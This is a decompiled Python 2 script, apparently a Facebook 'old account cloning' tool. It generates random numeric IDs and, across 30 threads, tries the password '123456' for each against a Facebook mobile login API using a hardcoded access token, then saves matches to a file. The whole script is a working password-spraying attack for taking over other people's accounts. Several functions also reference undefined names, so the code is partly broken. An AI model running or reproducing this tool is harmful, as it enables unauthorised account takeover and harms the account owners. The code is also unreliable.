# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-04-16 08:17:05.143914
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(90000):
    nmbr = random.randint(111111111, 999999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print '\n\x1b[36m\n     # #    # ### #     #  #####\n      # #   #   #  ##    # #     #\n      # #  #    #  # #   # #\n      # ###     #  #  #  # #  ####\n#     # #  #    #  #   # # #     #\n#     # #   #   #  #    ## #     #\n #####  #    # ### #     #  #####                                             \n\x1b[33m______________________________________________________\n\n[*] DEVELOPER : AryanNafas\n[*] TELEGRAM  : AryanHack907\n[*] GITHIB    :   AryanHack907\n[*] TOOLS     : OLD ID CLON 2009\n\n[*] UPDATE : JKING-907\n\x1b[32m_____________________________________________________\n'
logo1 = '\n\x1b[36m\n      # #    # ### #     #  #####\n      # #   #   #  ##    # #     #\n      # #  #    #  # #   # #\n      # ###     #  #  #  # #  ####\n#     # #  #    #  #   # # #     #\n#     # #   #   #  #    ## #     #\n #####  #    # ### #     #  #####\n                                                                                                  \n\x1b[33m______________________________________________________\n\n[*] DEVELOPER : AryanNafas\n[*] TELEGRAM : AryanHack907\n[*] GITHIB    : AryanHack907\n[*] TOOLS     : OLD ID CLON 2009\n\n[*] UPDATE : JKING-907\n\x1b[32m_____________________________________________________\n\n'
logo2 = '\n\x1b[36m\n      # #    # ### #     #  #####\n      # #   #   #  ##    # #     #\n      # #  #    #  # #   # #\n      # ###     #  #  #  # #  ####\n#     # #  #    #  #   # # #     #\n#     # #   #   #  #    ## #     #\n #####  #    # ### #     #  #####                                                                                \n\x1b[33m______________________________________________________\n\n[*] DEVELOPER : AryanNafas\n[*] TELEGRAM : AryanNafas\n[*] GITHIB    : AryanHack907\n[*] TOOLS     : OLD ID CLON 2009\n\n[*] UPDATE : JKING-907\n\x1b[32m_____________________________________________________\n\n'

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo1
    print '\x1b[1;32m[1]\x1b[1;33mSTART( \x1b[1;32mHACK)'
    time.sleep(0.05)
    print '\x1b[1;32m[2]\x1b[1;34mUPDATE (2.0)'
    time.sleep(0.05)
    print '\x1b[1;32m[0]\x1b[1;31mExit '
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;95mCHOOSE: \x1b[1;34m')
    if peak == '':
        print '\x1b[1;97mFill In Correctly'
        pilih_login()
    elif peak == '1':
        Zeek()


def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;33m[1]START CLONING 2004-2009'
    time.sleep(0.1)
    print '\x1b[1;33m[0]back'
    time.sleep(0.05)
    action()


def action():
    global oks
    peak = raw_input('\n\x1b[1;32mCHOOSE:\x1b[1;32m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo2
        print '(1) 2009-10 [Enter - 00]' + '\n'
        print '\x1b[1;35mEnter only 00 TO CLONE 2004-2009 ACCOUNT'
        try:
            c = raw_input('\x1b[1;32mCHOOSE : ')
            k = '1000'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            blackmafiax()

    elif peak == '0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50 * '\x1b[1;31m-'
    xxx = str(len(id))
    jalan('\x1b[1;32mTOTAL OLD IDZ NUMBER: ' + xxx)
    jalan('\x1b[1;32mCODE YOU CHOOSE ' + c)
    jalan('\x1b[1;32mWait A While \x1b[1;32mStart Cracking...')
    jalan('\x1b[1;33mTo Stop Process Press Ctrl+z')
    print 50 * '\x1b[1;35m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;32m(JKING-CP)  ' + k + c + user + '  |  ' + pass1 + '\x1b[1;33m   [Open After 7 Days]\x1b[0m \n'
                okb = open('save/cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;32m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
    jalan('Note : Your Offline account Will Open after 4 days')
    print ''
    print '\n    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91JKINGO \xe2\x95\x91\x1b[1;95mFb\x1b[1;97m \n\x1b[1;95m033[1;97m'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    login()
